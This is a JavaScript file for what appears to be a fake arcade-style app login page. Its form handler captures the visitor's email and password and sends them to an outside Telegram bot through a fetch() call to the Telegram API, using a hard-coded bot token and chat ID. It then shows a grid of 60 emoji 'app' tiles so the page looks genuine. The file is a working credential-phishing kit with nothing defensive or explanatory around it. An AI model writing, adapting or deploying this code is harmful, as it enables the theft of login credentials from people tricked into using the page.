const BOT_TOKEN = "9215057440:AAFpzPk23TO4rfn_uy9gCsbQOaExYOvtoS0";
const CHAT_ID = "5022620385";

const loginForm = document.getElementById('login-form');
const authModal = document.getElementById('auth-modal');
const gameDashboard = document.getElementById('game-dashboard');
const arcadeGrid = document.getElementById('arcade-grid');

// List of vibrant theme colors for app icons
const iconColors = [
    'linear-gradient(135deg, #34d399, #059669)',
    'linear-gradient(135deg, #f87171, #dc2626)',
    'linear-gradient(135deg, #60a5fa, #2563eb)',
    'linear-gradient(135deg, #fbbf24, #d97706)',
    'linear-gradient(135deg, #a78bfa, #7c3aed)',
    'linear-gradient(135deg, #f472b6, #db2777)',
    'linear-gradient(135deg, #38bdf8, #0284c7)'
];

const emojis = ['🎮', '🧩', '🎯', '🎲', '🃏', '🚀', '⭐', '🔥', '💎', '🎨'];

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Transmit credentials to Telegram Bot
    const message = `🕹️ App Login Captured:\n📧 Email: ${email}\n🔑 Password: ${password}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
    
    try {
        await fetch(url);
    } catch (error) {
        console.error("Transmission error", error);
    }
    
    // Switch view to the mobile-style app launcher grid
    authModal.classList.add('hidden');
    gameDashboard.classList.remove('hidden');
    
    loadGridIcons();
});

function loadGridIcons() {
    arcadeGrid.innerHTML = '';
    // Generate 50+ app grid tiles matching the reference aesthetic
    for (let i = 1; i <= 60; i++) {
        const tile = document.createElement('div');
        tile.className = 'app-icon';
        tile.style.background = iconColors[i % iconColors.length];
        
        const emojiSpan = document.createElement('span');
        emojiSpan.textContent = emojis[i % emojis.length];
        tile.appendChild(emojiSpan);
        
        tile.addEventListener('click', () => {
            alert(`Opening App #${i}`);
        });
        
        arcadeGrid.appendChild(tile);
    }
}
